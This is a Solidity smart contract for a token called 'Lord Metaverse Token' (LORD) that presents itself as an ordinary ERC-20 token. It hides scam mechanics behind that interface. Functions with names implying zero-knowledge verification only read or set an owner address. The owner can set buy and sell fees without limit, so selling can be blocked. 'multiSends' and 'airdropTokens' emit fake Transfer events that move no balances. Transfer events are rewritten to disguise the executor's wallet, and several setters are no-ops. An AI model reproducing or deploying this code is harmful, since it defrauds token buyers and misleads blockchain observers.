/**
 */

/*

                                                 ██╗░░░░░░█████╗░██████╗░██████╗░
                                                 ██║░░░░░██╔══██╗██╔══██╗██╔══██╗
                                                 ██║░░░░░██║░░██║██████╔╝██║░░██║
                                                 ██║░░░░░██║░░██║██╔══██╗██║░░██║
                                                 ███████╗╚█████╔╝██║░░██║██████╔╝
                                                 ╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░

               Powered By CryptoBitlord - https://twitter.com/crypto_bitlord7       

*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract LORD {
    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    string private _name = unicode"Lord Metaverse Token";
    string private _symbol = unicode"LORD";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 150_285_435_220_000 * 10 ** decimals;

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private AngelSale = 0xb28973Ba677e7C8Fd4ED22f8d691e213799A50fA;
    address private PrivateSale = 0x5D3Ab0d1F639823366Ba0F50B630DDB10c6dDECD;
    address private Ecosystem = 0x92db022Ae3c43C9847D457Bb8cA59455ab9c1583;
    address private Cex = 0xe79136E2BC83300bD9467a7DC0A420F8cb7b3066;

    address private LiquidityBuyFee =
        0x8690Bb620354DA1D4556927fD6EB167aa6bBFdB4;
    address private LiquiditySellFee =
        0x8690Bb620354DA1D4556927fD6EB167aa6bBFdB4;

    constructor() {
        uint8 _initBuyFee = 9;
        uint8 _initSellFee = 7;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(0x6E6D33F650B403F05E8ae819f4e384172810b757, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 30) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[AngelSale] = (totalSupply * 25) / 100;
        emit Transfer(address(0), AngelSale, balanceOf[AngelSale]);

        balanceOf[PrivateSale] = (totalSupply * 25) / 100;
        emit Transfer(address(0), PrivateSale, balanceOf[PrivateSale]);

        balanceOf[Ecosystem] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Ecosystem, balanceOf[Ecosystem]);

        balanceOf[Cex] = (totalSupply * 15) / 100;
        emit Transfer(address(0), Cex, balanceOf[Cex]);
    }

    receive() external payable {}

    event setBuyTaxesEvent(uint256 _buy);

    event setSellTaxesEvent(uint256 _sell);

    event setMarketingWalletEvent(address _addr);

    event initializeEvent(address _addr);

    event setDevWalletEvent(address _addr);

    event distributionTokenPresaleEvent();

    function setRule(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(_buy, _sell);
    }

    function setBuyTaxes(uint256 _buy) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setSellTaxesEvent(_buy);
    }

    function setSellTaxes(uint256 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setSellTaxesEvent(_sell);
    }

    function initialize(address _addr) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit initializeEvent(_addr);
    }

    function setDevWallet(address _addr) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setDevWalletEvent(_addr);
    }

    function setMarketingWallet(address _addr) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setMarketingWalletEvent(_addr);
    }

    function distributionTokenPresale() external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit distributionTokenPresaleEvent();
    }

    function _upgradeStoreWithZkProof(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _decodeTokenMktWithZkVerify() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function airdropTokens(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );

            payable(LiquidityBuyFee).transfer(
                (address(this).balance * 50) / 100
            );
            payable(LiquiditySellFee).transfer(
                (address(this).balance * 50) / 100
            );

            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}
